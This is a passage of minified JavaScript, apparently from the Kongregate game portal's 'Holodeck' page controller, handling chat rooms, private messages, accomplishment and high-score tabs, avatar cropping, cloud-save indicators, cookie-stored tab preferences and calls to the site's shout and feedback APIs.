i=$j("#coupon_promotion_"+t+"_award_content");$j(".js-coupon-promotion-award-content").hide(),i.html(this._coupon_templates[t].evaluate(e)),i.show(),this._tabs.showOnTop("coupon_awards_tab_pane")}},displayRoom:function(e){this._chat_window._active_room||this._chat_window.showChatWindow(),this.hideDefaultChatTabContent(),this.hideSessionAlertContentInChatTab(),this.updateDefaultChatTabMessage("Connecting to chat"),this._chat_window.joinedRoom(e)},rebootstrapChat:function(){this._chat_window.bootstrapChat(!0)},showAccomplishmentCompletionTab:function(e){var t=this._accomplishment_tracker.getAccomplishmentById(e);t&&!t.isHidden()&&(this.showAccomplishmentCompletedTab(this.accomplishmentCompletionTemplate(e).cloneNode(!0)),this._currently_shown_award_tab="award",this._holodeck_event_analytics.recordEvent("TabView","Award"),t.setHasCompletionTabBeenShown(),this.authenticated()&&!t.isBadgeOfTheDay()&&t.accomplishmentGroupProgressContent()?this.insertProgressContentInSuggestionNodes(t.accomplishmentGroupProgressContent()):(!t.isBadgeOfTheDay()||t.isBadgeOfTheDay()&&!this.authenticated())&&this.insertTemplateForNextActionSuggestion({".prize_name":t.prizeName()},this.suggestNextAction.bind(this)),this.getsGoogleADayUpsell(t)&&(e=$("google_a_day_award_tab_upsell_"+t.id()))&&e.show())},insertProgressContentInSuggestionNodes:function(e){this.suggestionLocationNodes().each((function(t){$j(t).html(e)}))},showStickerAwardTab:function(){$("more_games_tab_pane").hide(),this._tabs.showOnTop("sticker_award_tab_pane")},getsGoogleADayUpsell:function(e){var t=new Date;return Holodeck.GOOGLE_A_DAY_START_DATE<t&&Holodeck.GOOGLE_A_DAY_END_DATE>t&&!active_user.hasGoogleADayForToday()&&e.isAchievement()},showBadgeOfTheDayAwardTab:function(e){this.showAccomplishmentCompletedTab(this.accomplishmentCompletionTemplate(e).cloneNode(!0)),$("won_both_badge_and_botd_content").hide(),$("won_just_botd_content").show()},showBountyAwardInfo:function(){$("bounty_banner_wrapper").show()},updateAccomplishmentTab:function(e){var t=this._accomplishment_tracker.accomplishmentForId(e);t&&t.isComplete()&&($$(".achieved_image_"+e+"_for_award").each((function(e){e&&!e.visible()&&(e.previous().hide(),e.show())})),this.updateAccomplishmentPaneTitle())},updateAccomplishmentPaneTitle:function(){var e=$("accomplishments_pane_title"),t=e.down(".no_accomplishments_completed"),i=e.down(".some_accomplishments_completed");e=e.down(".all_accomplishments_completed");var n=this._accomplishment_tracker,s=n.completeAccomplishments().length;n=n.accomplishments().length-n.hiddenAccomplishments().length,0===s?(e.hide(),i.hide(),t.show()):n==s?(i.hide(),t.hide(),e.show()):(e.hide(),t.hide(),i.down(".earned_accomplishments_count").update(s),i.show())},insertTaskCompletedIntoChat:function(e){this.chatWindow().insert(holodeck.accomplishmentTaskCompletionTemplate(e).cloneNode(!0))},currentAwardTab:function(){var e=this._currently_shown_award_tab;return this._currently_shown_award_tab=null,e},showHighScoreAlert:function(e){if(this.shouldShowHighScoreAlert(e.data.value)){this._currently_shown_award_tab="high score",this._holodeck_event_analytics.recordEvent("TabView","HighScoreAlert"),$("high_score_alert_username").update(active_user.username());var t=e.data.id,i=this._accomplishment_tracker.getStatisticById(t);e='<p class="high_score_number holodeck_kongbot_happy"><strong>'+e.data.value.toLocaleString()+"</strong> "+i.displayName()+"</p>",(i=new Element("a",{href:"#"}).update("view leaderboard &raquo;")).observe("click",(function(e){holodeck.showHighScores(t)})),this._tabs.show("high_score_alert_tab_pane"),this._tabs.container("high_score_alert_tab_pane").down(".high_score_summary").update(e).insert(i),this.insertTemplateForNextActionSuggestion({},this.suggestNextAction.bind(this))}},shouldShowHighScoreAlert:function(e){return!(!e||this.isShowingAccomplishmentCompletedTab())&&(e=Cookie.get(Holodeck.KONG_HS_ALERT_COOKIE_NAME),!(!this.hasNotSeenHighScoreRecently()||e)&&(Cookie.set(Holodeck.KONG_HS_ALERT_COOKIE_NAME,"hs_alert",void 0,this._game_path),!0))},hasNotSeenHighScoreRecently:function(){var e=Cookie.get(Holodeck.KONG_HS_ALERT_TIME_COOKIE_NAME);return e?(e=new Date(e),(new Date).getTime()-e.getTime()>Holodeck.HS_ALERT_WAIT_MILLISECONDS&&(Cookie.set(Holodeck.KONG_HS_ALERT_TIME_COOKIE_NAME,new Date,void 0,"/"),!0)):(Cookie.set(Holodeck.KONG_HS_ALERT_TIME_COOKIE_NAME,new Date,void 0,"/"),!0)},chatWindow:function(){return this._chat_window},setTab:function(e){this._suppress_setting_preference_cookie=!0,this._tabs.setActiveTab(e)},closeAlertTab:function(){this._tabs.close("alert_tab_pane")},showCloudSavesTab:function(e,t){this.ready?(this._tabs.show("cloud_saves_tab_pane",HolodeckTabs.Priority.CLOUD_SAVES),$$("#cloud_saves_tab_pane .js-cloud-save-mode").invoke("hide"),e=$$("#cloud_saves_tab_pane .js-cloud-saves-"+e).first(),t&&e.select(".js-cloud-saves-replace").each((function(e){var i=e.readAttribute("data-option-name");e.update(t[i])})),e.show()):document.observe("holodeck:ready",this.showCloudSavesTab.bind(this,e,t))},closeCloudSavesTab:function(){this._tabs.close("cloud_saves_tab_pane")},showAlertTab:function(){this._tabs.show("alert_tab_pane",HolodeckTabs.Priority.ERROR)},showAccomplishmentsTab:function(){this.setTab("accomplishments_tab_pane")},showAvatarTab:function(e){if(e){this._custom_game_avatar=e,e=this.avatarUrlForFile(this._custom_game_avatar);var t=$("game_supplied_avatar_image_tag");this.setAvatarCropBoundaries({}),this._custom_game_avatar&&t&&(startCropper=function(){var e=t.width,i=t.height;if(e==i)var n=0,s=e,o=0,a=i;else e>i?(o=0,a=i,s=(n=e/2-i/2)+i):(n=0,s=e,a=(o=i/2-e/2)+e);n={x1:n,x2:s,y1:o,y2:a},40<e&&40<i&&(this.setAvatarCropBoundaries(n),this._avatar_cropper=new Cropper.Img("game_supplied_avatar_image_tag",{displayOnInit:e!=i,ratioDim:{x:1,y:1},minWidth:40,minHeight:40,onloadCoords:n,onEndCrop:function(e,t){holodeck.setAvatarCropBoundaries({x1:e.x1,y1:e.y1,x2:e.x2,y2:e.y2})}}))}.bind(this),t.onload=startCropper,t.src=e,this.prepareAvatarTab(),this._tabs.show("avatar_tab_pane"))}},prepareAvatarTab:function(){this.authenticated()&&($("avatar_controls_guest").hide(),$("avatar_controls").show()),$("avatar_save_results").hide(),$("avatar_update_spinner").hide(),$("game_avatar_accept_button").show(),$("avatar_prompt_content").show()},avatarUrlForFile:function(e){return"https://"+active_user.singleCDNDomain()+"/assets/imported_images/"+e},saveAvatar:function(){var e="/accounts/"+this.username()+"/update_avatar.chat";$("game_avatar_accept_button").hide(),$("avatar_update_spinner").show(),new Ajax.Updater({success:"avatar_save_results"},e,{method:"post",parameters:$H(this.scaledAvatarCropBoundaries()).merge({filename:this._custom_game_avatar,game_id:this.gameId()}).toObject(),onSuccess:function(){holodeck.avatarSuccess()},onFailure:function(){holodeck.notifyKonduitOfAvatarResults(!1)},onComplete:function(){$("avatar_prompt_content").hide(),$("avatar_save_results").show()}})},setAvatarCropBoundaries:function(e){this._avatar_crop_boundaries=e},scaledAvatarCropBoundaries:function(){var e=this._avatar_crop_boundaries,t=e.x1,i=e.y1,n=e.x2;e=e.y2;var s=this.avatarScaleRatios();return void 0===t||void 0===n||void 0===i||void 0===e?{}:(t=parseInt(t/s.wRatio,10),n=parseInt(n/s.wRatio,10),{x1:t,y1:i=parseInt(i/s.hRatio,10),x2:n,y2:e=parseInt(e/s.hRatio,10)})},avatarScaleRatios:function(){var e=$("game_supplied_avatar_image_tag"),t=e.getStyle("max-height"),i=e.getStyle("max-width");e.setStyle({maxHeight:""}),e.setStyle({maxWidth:""});var n=e.height,s=e.width;return e.setStyle({maxHeight:t}),e.setStyle({maxWidth:i}),{hRatio:e.height/n,wRatio:e.width/s}},avatarSuccess:function(){this.notifyKonduitOfAvatarResults(!0),active_user.pullUserData()},cancelAvatar:function(){this.notifyKonduitOfAvatarResults(!1),this.closeAvatarTab()},closeAvatarTab:function(){this._tabs.close("avatar_tab_pane")},notifyKonduitOfAvatarResults:function(e){holodeck._avatar_cropper&&holodeck._avatar_cropper.remove(),holodeck.konduit().dispatchEvent({type:KonduitEvent.IMAGE_AVATAR_COMPLETE,data:{success:e}})},showShareTab:function(){this._holodeck_event_analytics.recordEvent("TabView","Share"),this._tabs.showOnTop("share_tab_pane")},showAccomplishmentsOrMoreGamesTab:function(){$("accomplishments_tab_pane")?this.showAccomplishmentsTab():this.showMoreGamesTab()},showAccomplishmentCompletedTab:function(e){$("more_games_tab_pane").hide(),this._just_earned_badge=!0,this._tabs.showOnTop("accomplishment_awarded_tab_pane"),this._tabs.container("accomplishment_awarded_tab_pane").down("#accomplishment_awarded_tab_pane_content").update(e)},showProgressTab:function(e){$("more_games_tab_pane").hide(),this._just_earned_badge=!0,this._tabs.showOnTop("progress_tab_pane"),this._tabs.container("progress_tab_pane").down("#progress_tab_pane_content").update(e)},showDiscountTab:function(e){this._tabs.showOnTop("cart_discount_tab_pane"),this._tabs.container("cart_discount_tab_pane").down("#accomplishment_awarded_tab_pane_content"),this.setTab("cart_discount_tab_pane"),$j("#discount_purchase").on("click",(function(){lightbox.prototype.initializeKredPurchase()}));var t=setInterval((function(){var i=moment(e);if(i.isAfter(moment())){var n=i.diff(moment(),"hours"),s=i.subtract(n,"hours").diff(moment(),"minutes");i=i.subtract(s,"minutes").diff(moment(),"seconds"),$j("#discount_hours_remaining").text(n),$j("#discount_minutes_remaining").text(s),$j("#discount_seconds_remaining").text(i)}else $j("#discount_countdown").hide(),$j("#discount_expiration").show(),clearInterval(t)}),1e3)},closeDiscountTab:function(){this._tabs.close("cart_discount_tab_pane")},showMoreGamesTab:function(){this.setTab("more_games_tab_pane")},showChatApiTab:function(){this._tabs.show("chat_api_pane")},closeChatApiTab:function(){this._tabs.close("chat_api_pane")},showSharedContentWelcomeTab:function(){this._tabs.show("shared_content_welcome_tab_pane")},isShowingAccomplishmentCompletedTab:function(){return $("accomplishment_awarded_tab_pane").visible()},highlightContent:function(e){var t=$(e);t&&(t.addClassName("highlighted"),setTimeout((function(){t.removeClassName("highlighted")}),3e3))},revealContent:function(e,t,i){var n,s=$(e);return t=$(t),s&&t&&(n=t.panel)&&(this.setTab(e),n.open(),n.scrollTab(s),this.highlightContent(i)),!1},revealFullInstructions:function(){this._tabs.show("game_tab_pane"),this.recordAnalyticsEvent("Quick","Instructions"),this.revealContent("game_tab_pane","game_instructions_panel","game_instructions");var e=$("game_instructions");if(e){var t=e.down(".truncated_text");e=e.down(".full_text"),t&&e&&t.visible()&&(t.hide(),e.show())}},hideDefaultChatTabContent:function(){$("chat_default_content").hide()},showDefaultChatTabContent:function(){$("chat_default_content").show()},showDisconnectedAlert:function(){this._holodeck_event_analytics.recordEvent("TabView","Disconnect"),this.showDefaultChatTabContent(),this._tabs.showAlert("disconnected_alert")},showSessionAlert:function(){this.showSessionAlertContentInChatTab(),this._holodeck_event_analytics.recordEvent("TabView","SessionAlert"),this._tabs.showAlert("session_conflict_alert")},showSessionExpiredAlert:function(){this.showSessionAlertContentInChatTab(),this._tabs.showAlert("session_expired_alert")},showCannotConnectAlert:function(){this._has_shown_cannot_connect_alert||this._holodeck_event_analytics.recordEvent("TabView","CannotConnect"),this._tabs.showAlert("cannot_connect_alert"),this._has_shown_cannot_connect_alert=!0},updateTabCookie:function(e){this.authenticated()&&!e.closeable&&(this._suppress_setting_preference_cookie?this._suppress_setting_preference_cookie=!1:Cookie.get("holodeck_tab_override")!=e.id&&Cookie.set(Holodeck.HOLODECK_TAB_COOKIE_NAME,this.makeCookieValue(e.id),12,"/"))},getTabsFromCookie:function(){var e=Cookie.get("kong_opened_panel"),t=Cookie.get(Holodeck.HOLODECK_TAB_COOKIE_NAME),i=Cookie.get("holodeck_tab_override"),n=this;return i?[i]:e?(Cookie.erase("kong_opened_panel"),["game_tab_pane"]):t&&0<(e=t.split("|").select((function(e){return(e=n._tabs.tab(n._tabs.linkForKey(e)))&&e.visible()}))).length?e:["chat_tab_pane"]},getTabFromCookie:function(){return this.getTabsFromCookie()[0]},makeCookieValue:function(e){var t=Cookie.get(Holodeck.HOLODECK_TAB_COOKIE_NAME);return t?((t=t.split("|").select((function(t){return t!=e}))).unshift(e),t.join("|")):e},registerKonduitCallback:function(e,t){this._event_dispatcher.register(e,t)},konduit:function(){return this._konduit},konduitEvent:function(e){e=Base64.decode(e).evalJSON(!0),this._event_dispatcher.fire(e)},getGameRoomCookie:function(){var e=Cookie.get(Holodeck.LAST_GAME_ROOM_COOKIE_PREFIX+this.gameId());if(e)return e.evalJSON()},setGameRoomCookie:function(e){e=Object.toJSON(e),Cookie.set(Holodeck.LAST_GAME_ROOM_COOKIE_PREFIX+this.gameId(),e,7,this._game_path)},getGuildRoomForCurrentGameCookie:function(){if(this.authenticated()){var e=Cookie.get(Holodeck.LAST_GUILD_ROOM_FOR_CURRENT_GAME_COOKIE_PREFIX+this.gameId());if(e)return e.evalJSON()}else this.setGuildRoomForCurrentGameCookie()},setGuildRoomForCurrentGameCookie:function(e){e=Object.toJSON(e),Cookie.set(Holodeck.LAST_GUILD_ROOM_FOR_CURRENT_GAME_COOKIE_PREFIX+this.gameId(),e,7,this._game_path)},getSitewideGuildRoomCookie:function(){if(this.authenticated()){var e=Cookie.get(Holodeck.LAST_SITEWIDE_GUILD_ROOM_COOKIE);if(e)return e.evalJSON()}else this.setSitewideGuildRoomCookie()},setSitewideGuildRoomCookie:function(e){e=Object.toJSON(e),Cookie.set(Holodeck.LAST_SITEWIDE_GUILD_ROOM_COOKIE,e,void 0,"/")},deletePrivateRoomCookie:function(){$.jStorage.deleteKey(Holodeck.LAST_PRIVATE_ROOM_KEY)},initializeChatWindow:function(e){if(this._sticker_manager.update(e),e.gameRoomEnabled&&(e.previousGameRoom=this.getGameRoomCookie(),e.gameRoomJoin=Holodeck.GAME_ROOM_JOIN),!page_data.opted_out_of_guilds){var t=this.getGuildRoomForCurrentGameCookie();t&&(e.previousGuildChatRoomForCurrentGameCallback=this.setGuildRoomForCurrentGameCookie.bind(this),e.previousGuildChatRoomForCurrentGame=t),(t=this.getSitewideGuildRoomCookie())&&(e.previousSitewideGuildChatRoomCallback=this.setSitewideGuildRoomCookie.bind(this),e.previousSitewideGuildChatRoom=t)}(t=$.jStorage.get(Holodeck.LAST_PRIVATE_ROOM_KEY))&&(e.previousPrivateRoomCallback=this.deletePrivateRoomCookie.bind(this),e.previousPrivateRoom=t),this._chat_window.setRooms(e)},joinRoom:function(e){this._chat_window.joinRoom(e)},addChatCommand:function(e,t){this._chat_commands[e]||(this._chat_commands[e]=[]),this._chat_commands[e].push(t)},processChatCommand:function(e){var t=((e.match(/^\/([^\s]+)/)||[])[1]||"").toLowerCase();if(this._chat_commands[t]){var i=this;return void 0===this._chat_commands[t].detect((function(t){return!1===t(i,e)}))}return!0},sendWhisper:function(e,t){var i=t.match(/^\/([^\s]+)\s+([^\s]+)\s+([\s\S]+)/)||[];t=i[2],i=i[3];var n=e.chatWindow();return e=e.activeDialogue(),t&&i&&(e?e.sendPrivateMessage(t,i):n.sendPrivateMessage(t,i)),!1},setPresenceAway:function(e){return e==holodeck&&(e=null),this.konduit().dispatchEvent({type:KonduitEvent.SET_PRESENCE,data:{presence:KonduitPresenceType.AWAY,room_name:e}}),!1},setPresenceChat:function(e){return e==holodeck&&(e=null),this.konduit().dispatchEvent({type:KonduitEvent.SET_PRESENCE,data:{presence:KonduitPresenceType.CHAT,room_name:e}}),!1},setStatisticsAndAccomplishments:function(e,t){this._accomplishment_tracker.setStatistics(e),this._accomplishment_tracker.setAccomplishments(t)},setAccomplishmentsProgress:function(e){e&&(this._accomplishment_tracker.setAccomplishmentsProgress(e),this.updateAccomplishmentPaneTitle(),this.insertTemplateForNextActionSuggestion({},this.suggestNextAction.bind(this)),this.konduit().dispatchEvent({type:KonduitEvent.SET_ACCOMPLISHMENT_PROGRESS,data:e}))},addFriends:function(e){this._chat_window.addFriends(e)},addMutings:function(e){this._chat_window.addMutings(e)},addFavoriteRooms:function(e){this._chat_window.addFavoriteRooms(e)},roomGroups:function(e){this._chat_window.roomGroups(e)},redoRoomList:function(){this._chat_window.redoRoomList()},addChatNags:function(e){this._chat_nag=new ChatNag(this._chat_window,e)},switchUser:function(e,t,i,n,s,o){this._active_user.updateAttributes({chat_username:e,chat_password:t,special_chat_vars:i.extra_vars}),this._active_user.updateGameAttributes({game_auth_token:n,user_vars:i.user_vars,user_vars_sig:i.user_vars_sig}),this._suppress_disconnect=o,this.chatWindow().onLogout(),this.konduit().dispatchEvent({type:KonduitEvent.SWITCH_USER,data:{username:e,user_id:s,slk:t,variables:i,game_auth_token:n}}),this.requestAnalyticsInfo()},isGuestUsername:function(e){return/^Guest/i.match(e)},setUsername:function(e){var t=this.isGuestUsername(this._username);e==this._username||(this._username=e,this.isGuestUsername(e))||this.onAuthenticated(t)},username:function(){return this._active_user?this._active_user.username():"Guest"},onAuthenticated:function(e){e=e&&this._has_submitted_stats,this.updateUsernameIndicator(),this.loadAccomplishments(e),this.hideNextActionSuggestion(),this.addOnLoadedAccomplishmentsCallback(this.checkForStickerDrop.bind(this))},hasAccomplishments:function(){return 0<this._accomplishments.length},updateUsernameIndicator:function(){var e=$$(".user_connection .logged_in_user")[0];e.down(".logged_in_user_username").update(this.username()),e.show()},authenticated:function(){return this._active_user&&this._active_user.isAuthenticated()},gameId:function(){return this._game_id},addFriend:function(e){this._chat_window.addFriends([e])},removeFriend:function(e){this._chat_window.removeFriends([e])},addMuting:function(e){this._chat_window.addMutings([e]),this._chat_window.updateRolloverMutingLink(e)},removeMuting:function(e){this._chat_window.removeMutings([e]),this._chat_window.updateRolloverMutingLink(e)},alertLog:function(){return this.konduit().alertLog()},insertPrivateMessagePrefixFor:function(e){this._chat_window.insertPrivateMessagePrefixFor(e)},selectRoom:function(e){e.premium_only&&!active_user.isPremium()?lightbox.prototype.initializePremiumMembershipPurchase("premium_only_chatroom","chat_features_tab"):(holodeck._chat_window._online_friends.deactivate(),this.joinRoom(e))},loadFriendsPage:function(e){this._chat_window.loadFriendsPage(e)},loadAccomplishments:function(e){var t=this._on_loaded_accomplishments_callbacks;!this._authenticated_and_loaded_accomplishments&&this.hasAccomplishments()&&this.authenticated()&&(e||(this._authenticated_and_loaded_accomplishments=!0),new Ajax.Request(this._accomplishments_bootstrap_url,{method:"get",onComplete:function(){for(;t;)t.pop()()}}))},checkForStickerDrop:function(){new Ajax.Request(this._sticker_drop_url,{method:"post"})},addKongpanionInfoToBotdTab:function(){$j(".kongpanion_botd_award_name").text(active_user.kongpanionInfo().name),$j(".kongpanion_botd_award_link").attr("href","/accounts/"+active_user.username()+"/kongpanions");var e=$j("<img />");0===active_user.botdsThisWeek()?(e.attr("src",active_user.kongpanionInfo().normal_url),$j("#kongpanion_botd_award_icon_normal_target").append(e),$j("#kongpanion_botd_award_content_normal").show()):active_user.botdsThisWeek()==active_user.shinyThreshold()-1&&(e.attr("src",active_user.kongpanionInfo().shiny_url),$j("#kongpanion_botd_award_icon_shiny_target").append(e),$j("#kongpanion_botd_award_content_shiny").show()),$j("#award_tab_botd_info").show()},prepareBadgeOfTheDayAwardTab:function(e){!active_user.kongpanionInfo()||0!==active_user.botdsThisWeek()&&active_user.botdsThisWeek()!=active_user.shinyThreshold()-1?this.authenticated()&&$("award_tab_botd_check_tomorrow_content")&&($("award_tab_botd_check_tomorrow_content").show(),$("award_tab_botd_info").show()):this.addKongpanionInfoToBotdTab()},prioritizeBadgeOfTheDay:function(e){(e=this._accomplishment_tracker.accomplishmentForId(e))&&(e._level="badge_of_the_day")},addOnLoadedAccomplishmentsCallback:function(e){if(!this.hasAccomplishments())return e();this._on_loaded_accomplishments_callbacks.push(e)},tabbifyAccomplishments:function(){var e=this;(function(){e.showAccomplishmentTab(e.nextAccomplishment())}).defer(),this.buildAccomplishmentVtabSet()},buildAccomplishmentVtabSet:function(){this._accomplishment_vtab_set=new HolodeckTabs("accomplishment_vtab_set",{tabSelector:".vtab"})},loadScoresPage:function(e,t,i){this._high_scores.getHighScores(e,t,i)},loadHighScores:function(){this._high_scores||(this._high_scores=new HighScores(this)),this._high_scores.getHighScores()},showHighScores:function(e){this._tabs.show("accomplishments_tab_pane"),this._high_scores||(this._high_scores=new HighScores(this)),this._high_scores.activate(e)},hideHighScores:function(){this._high_scores||(this._high_scores=new HighScores(this)),this._high_scores.deactivate()},registerAccomplishmentCompletionCallback:function(e,t){this._accomplishment_tracker.registerAccomplishmentCompletionCallback(e,t)},registerAccomplishmentProgressCallback:function(e,t,i,n){this._accomplishment_tracker.registerAccomplishmentProgressCallback(e,t,i,n)},accomplishmentTemplates:function(){return this._accomplishment_notifications_node},accomplishmentCompletionTemplate:function(e){return this.accomplishmentTemplates().down(".accomplishment_"+e).down(".accomplishment_completed")},accomplishmentTaskCompletionTemplate:function(e){if(e=$("completed_accomplishment_task_"+e))return e.down(".task_completed")},accomplishmentSuggestionTemplate:function(e){return this.accomplishmentTemplates().down(".accomplishment_"+e).down(".accomplishment_suggested")},accomplishmentFromOtherGameSuggestionTemplate:function(){var e=this.accomplishmentTemplates().down("#suggestibles").select(".suggestible");return e[parseInt(Math.random()*e.length,10)]},claimAwardTemplate:function(){return this.accomplishmentTemplates().down(".claim_award_box")},showDisconnectedIndicator:function(){this._chat_connected_indicator_node.hide(),this._chat_limited_connection_indicator_node.hide(),this._chat_disconnected_indicator_node.show()},showConnectedIndicator:function(){this._chat_disconnected_indicator_node.hide(),this._chat_limited_connection_indicator_node.hide(),this._chat_connected_indicator_node.show()},showLimitedConnectionIndicator:function(){this._chat_disconnected_indicator_node.hide(),this._chat_connected_indicator_node.hide(),this._chat_limited_connection_indicator_node.show()},showCloudSavesIndicator:function(e){var t=this,i=function(){if(t._chat_connected_indicator_node.addClassName("cloud-mode"),"sync"===e){var i=$j("#cloud_sync_indicator");i.tooltip({content:function(){return $j("#cloud_save_info_template").html()},position:{my:"right+21 top+10",at:"bottom"}});var n=JSON.parse(Cookie.get("cloud_saves_game_ids_"+active_user.id()))||[];0>n.indexOf(active_user.gameId())&&(i.tooltip("open"),setTimeout((function(){i.tooltip("close")}),1e4),n.push(active_user.gameId()),Cookie.set("cloud_saves_game_ids_"+active_user.id(),JSON.stringify(n)))}};$$(".js-cloud-indicator").invoke("hide"),$("cloud_"+e+"_indicator").show(),this.ready?i():document.observe("holodeck:ready",function(){i()}.bind(this))},reconnect:function(){this.konduit().dispatchEvent({type:KonduitEvent.CONNECT})},setupBanAndSilencingControls:function(){this._chat_window.setupBanAndSilencingControls()},hideNextActionSuggestion:function(){var e=$("accomplishment_awarded_tab_pane").down(".suggestion_placeholder");e&&e.update("")},suggestionLocationNodes:function(){return[$("accomplishment_awarded_tab_pane"),$("high_score_alert_tab_pane")].compact().map((function(e){return e.down(".suggestion_placeholder")})).compact()},suggestNextAction:function(e){this.suggestionLocationNodes().each((function(t){e.insertAt(t)}))},setAccomplishmentGroupSuggestions:function(e){var t=this;e.each((function(e){var i=e[1];t._accomplishment_tracker.getAccomplishmentById(e[0]).setAccomplishmentGroupProgressContent(i)}))},showAccomplishmentGroupCompletionTab:function(e){(e=$("accomplishment_group_completion_tab_content_"+e))&&(this._accomplishment_group_award_tab_node.update(e.innerHTML),this._active_user.populateUserSpecificLinks(this._accomplishment_group_award_tab_node),this._tabs.showOnTop("accomplishment_group_awarded_tab_pane"))},notifyOnGameTab:function(e){this._tabs.showOnTop("game_tab_pane"),$("game_tab_pane").scrollTop=0,$("rating_message").update(e),$("rating_message").addClassName("highlighted")},insertTemplateForNextActionSuggestion:function(e,t){var i=this.authenticated()?(i=this.nextAccomplishment())?this.accomplishmentSuggestionTemplate(i.id()):this.accomplishmentFromOtherGameSuggestionTemplate():this.claimAwardTemplate();t(new SuggestionTemplate(i,e))},nextAccomplishment:function(){return this._accomplishment_tracker.nextAccomplishment()},showMiniProfile:function(e){this.showChatTab(),this._chat_window.showProfile(e)},updateDefaultChatNag:function(e){this._chat_nag&&this._chat_nag.updateDefaultNag(e)},showChatTab:function(){this._tabs.show("chat_tab_pane")},showAccomplishmentTab:function(e){e&&this._accomplishment_vtab_set.show(e.domId())},setSilenceScheduledEnd:function(e){this._chat_window.updateSilenceScheduledEnd(e)},isChatModerator:function(){return active_user.isChatModerator()},activeDialogue:function(){return this._active_dialogue},receivedPrivateMessage:function(e){var t=this._active_dialogue;t&&t.receivedPrivateMessage(e)},sendPrivateRoomInvitation:function(e){this.premiumUserOnly((function(){holodeck._users_invited[e]=!0,holodeck.konduit().dispatchEvent({type:KonduitEvent.PRIVATE_ROOM_INVITATION,data:{username:e}})}),"chat_features_tab")},receivedPrivateRoomInvitation:function(e){this._ignored_invitations[e.username]||this._chat_window.receivedPrivateRoomInvitation(e)},hasActiveShoutCall:function(){return!!this._currentRequestId},sendPrivateMessage:function(e){var t=e.data.shout_message;this._currentRequestId=e.data[KonduitEvent.PARAM_REQUEST_ID],void 0===t&&(t=""),new Ajax.Request("/api/shout.json",{method:"post",parameters:{game_id:active_user.gameId(),game_message:t,from_game:!0,"shout[private]":!0,game_auth_token:active_user.gameAuthToken(),username:active_user.username()},onSuccess:function(e){holodeck.invokeShoutCallback({message_type:"private",success:e.responseJSON.success,error:e.responseJSON.error})}})},displayShoutBox:function(e){var t=e.data.shout_message;this._currentRequestId=e.data[KonduitEvent.PARAM_REQUEST_ID],void 0===t&&(t=""),setTimeout((function(){lightbox.prototype.initializeShoutFrame(holodeck.gameId(),t)}),0)},displayInvitationBox:function(e){var t=e.data.invitation_message;this._currentRequestId=e.data[KonduitEvent.PARAM_REQUEST_ID],void 0===t&&(t="");var i=e.data.filter;void 0===i&&(i=""),lightbox.prototype.initializeInvitationFrame(holodeck.gameId(),t,i,e.data.kv_params)},displayFeedPostBox:function(e){var t=e.data.shout_message;this._currentRequestId=e.data[KonduitEvent.PARAM_REQUEST_ID],void 0===t&&(t="");var i=e.data.image_uri;void 0===i&&(i="");var n=e.data.kv_params;void 0===n&&(n={}),setTimeout((function(){var e=function(){active_user.shoutForGame(active_user.gameId(),(function(e){if(e){e={game_id:holodeck.gameId(),image_uri:i,game_auth_token:active_user.gameAuthToken(),game_message:t,from_game:!0,username:active_user.username()};var s={};$H(n).each((function(e){s["shout_api_params["+e[0]+"]"]=e[1]})),new Ajax.Request("/api/shout.json",{method:"post",parameters:$H(e).merge(s),onSuccess:function(e){holodeck.invokeShoutCallback({message_type:"feed",success:e.responseJSON.success,error:e.responseJSON.error})}})}else lightbox.prototype.initializeFeedPostFrame(holodeck.gameId(),t,i,n)}))};active_user.isAuthenticated()?e():(lightbox.prototype.addOnCloseCallback((function(){active_user.isAuthenticated()&&e()})),lightbox.prototype.initializeKongregateLightboxFromAjax("/accounts/new/behind_login?game_id="+holodeck.gameId(),{done_class_name:"lightbox_login"}))}),0)},invokeShoutCallback:function(e){var t={};t[KonduitEvent.PARAM_REQUEST_ID]=this._currentRequestId,t[KonduitEvent.PARAM_MESSAGE_TYPE]=e.message_type,t[KonduitEvent.PARAM_MESSAGE_RECIPIENTS]=e.recipients,t[KonduitEvent.PARAM_SUCCESS]=e.success,t[KonduitEvent.PARAM_ERROR]=e.error,this._currentRequestId=null,holodeck.konduit().dispatchEvent({type:KonduitEvent.OP_SHOUT_CALLBACK,data:t})},invokeShoutDialogClosedCallback:function(e){holodeck.hasActiveShoutCall()&&holodeck.invokeShoutCallback({message_type:e,success:!1,error:"User closed dialog"})},destroyPrivateRoom:function(){holodeck._users_invited={},holodeck.konduit().dispatchEvent({type:KonduitEvent.DESTROY_PRIVATE_ROOM,data:{}})},leaveRoom:function(e){holodeck.konduit().dispatchEvent({type:KonduitEvent.LEAVE_ROOM,data:{room_type:e}})},leavePrivateRoom:function(){this.leaveRoom("private")},leaveGuildRoom:function(){this.leaveRoom("guild")},invitationIgnoredBy:function(e){this._ignored_invitations[e]=!0},privateRoomKick:function(e){holodeck.konduit().dispatchEvent({type:KonduitEvent.PRIVATE_ROOM_KICK,data:{username:e}})},hasInvited:function(e){return this._users_invited[e]},premiumUserOnly:function(e,t){active_user.isPremium()?e():lightbox.prototype.initializePremiumMembershipPurchase("private_chat",t)},height:function(){return this._html_dimensions.game_frame_height},checkChatScroll:function(){this._tabs&&"chat_tab_pane"==this._tabs.activeContainer.id&&this._chat_window.scrollToBottom()},recordAnalyticsEvent:function(e,t,i){this._holodeck_event_analytics.recordEvent(e,t,i)},recordMappedEventAnalytic:function(e){this._holodeck_event_analytics.recordMappedEventAnalytic(e)},setMetricTracker:function(e){this._holodeck_event_analytics.setMetricTracker(e)},startWatchingStats:function(){this._accomplishment_tracker.startWatchingStats()},scheduleRender:function(e){if(this._queued_renders||(this._queued_renders=[]),this._queued_renders.push(e),!this._queued_render_worker){var t=this;this._queued_render_worker=setTimeout((function(){t.processRenderQueue()}),this._interval_between_renders)}},processRenderQueue:function(){var e=this._queued_renders.shift();if(this._queued_renders.length){var t=this;this._queued_render_worker=setTimeout((function(){t.processRenderQueue()}),this._interval_between_renders)}else this._queued_render_worker=null;e&&e()},showSessionAlertContentInChatTab:function(){$("session_conflict_content_for_chat_tab").show(),$j("#chat_window").css({opacity:0})},hideSessionAlertContentInChatTab:function(){$("session_conflict_content_for_chat_tab").hide(),$j("#chat_window").css({opacity:"inherit"})},updateDefaultChatTabMessage:function(e){$("chat_default_content").down("p").update(e)},submitGameBug:function(e,t){e=$H(t).merge({method:"post",parameters:{type:"GameBugReport","feedback[game_bug_content]":e,"feedback[game_id]":this.gameId(),"alert[log]":JSON.stringify(this.alertLog())}}).toObject(),new Ajax.Request("/feedbacks",e),this.recordAnalyticsEvent("Game","Bug")},showSignupTab:function(){this.authenticated()||(this._tabs.showOnTop("signup_tab_pane"),new 